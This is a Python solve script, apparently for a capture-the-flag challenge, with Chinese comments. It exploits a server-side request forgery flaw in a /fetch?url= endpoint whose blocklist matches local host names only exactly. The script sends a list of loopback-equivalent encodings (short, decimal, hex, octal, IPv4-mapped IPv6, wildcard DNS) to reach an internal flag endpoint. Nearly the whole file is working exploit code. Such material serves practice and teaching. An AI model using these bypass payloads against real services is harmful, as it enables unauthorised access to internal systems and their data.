#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))
"""
Q37 · 综合 SSRF 黑名单绕过
目标: http://127.0.0.1:34963
思路: /fetch?url= 的 host 黑名单是字符串精确匹配 {127.0.0.1,localhost,0.0.0.0,::1}
      只要写一个解析后仍指向本地、但字面不在名单里的 host 即可绕过。
用法: python3 main.py [BASE_URL]
"""
import sys
import re
import requests

BASE = os.environ.get("GKD_URL") or (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:34963")
TARGET_PATH = "/internal/flag"

# 等价于 127.0.0.1 的常见绕过变体
PAYLOADS = [
    "127.1",                       # IPv4 短格式（最短最稳）
    "127.0.0.2",                   # loopback 段内任意地址
    "2130706433",                  # 十进制整数
    "0x7f000001",                  # 十六进制整数
    "0177.0.0.1",                  # 八进制
    "[::ffff:127.0.0.1]",          # IPv4-mapped IPv6
    "127.0.0.1.nip.io",            # DNS wildcard
]

FLAG_RE = re.compile(r"TOGOGO-flag\{[^}]+\}")


def try_payload(host: str) -> str | None:
    url = f"{BASE}/fetch?url=http://{host}{TARGET_PATH}"
    try:
        r = requests.get(url, timeout=5)
    except requests.RequestException as e:
        print(f"[!] {host:30s} -> error: {e}")
        return None
    body = r.text.strip().replace("\n", " ")
    short = body[:100]
    if r.status_code == 200 and "flag" in body.lower():
        m = FLAG_RE.search(body)
        flag = m.group(0) if m else None
        print(f"[+] {host:30s} -> OK    {short}")
        return flag
    print(f"[-] {host:30s} -> {r.status_code} {short}")
    return None


def main() -> int:
    print(f"[*] Target: {BASE}")
    print(f"[*] 直接访问内部接口（应 403）:")
    r = requests.get(BASE + TARGET_PATH, timeout=5)
    print(f"    {r.status_code} {r.text.strip()}\n")

    print(f"[*] 尝试 SSRF 绕过 payload:")
    flag = None
    for host in PAYLOADS:
        got = try_payload(host)
        if got and not flag:
            flag = got

    print()
    if flag:
        print(f"[★] FLAG = {flag}")
        return 0
    print("[x] 没拿到 flag，请检查目标是否存活")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
